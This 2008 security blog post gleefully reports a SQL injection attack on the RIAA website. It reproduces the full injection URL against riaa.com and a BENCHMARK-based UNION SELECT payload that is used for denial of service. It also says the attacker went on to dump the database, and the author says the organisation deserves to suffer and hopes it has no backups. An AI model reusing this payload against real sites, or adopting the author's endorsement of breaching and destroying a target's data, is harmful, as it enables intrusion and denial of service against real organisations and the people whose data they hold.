author: Marcin
disqus_id: 70cdae65-fc83-40dd-b806-36a90b2c1a0b
disqus_url: http://www.tssci-security.com/archives/2008/01/20/sql-injection-fun-vriaa/
mod_date: 2008-01-20 16:39:00
parent: 0
post_id: 366
post_type: post
pub_date: 2008-01-20 16:37:34
public: 'yes'
slug: sql-injection-fun-vriaa
tags:
- Hacking
- News
template: post.html
title: SQL Injection Fun v.RIAA

SQL Injection Fun v.RIAA
########################

What started as a simple `DoS against the RIAA through a SQL injection
vulnerability <http://reddit.com/info/660oo/comments/>`_, originally
posted to Reddit in `tinyurl
form <http://riaa.com/news_room.php?resultpage=9&news_year_filter=2007%20UNION%20ALL%20SELECT%20BENCHMARK(100000000,MD5('asdf')),NULL,NULL,NULL,NULL%20-->`_.

``UNION ALL SELECT BENCHMARK(100000000,MD5('asdf')),NULL,NULL,NULL,NULL%20--``

led an attacker on to dump their entire database. I sure hope they don't
have backups -- part of me thinks they deserve it and wants them to
suffer... muwhahaha
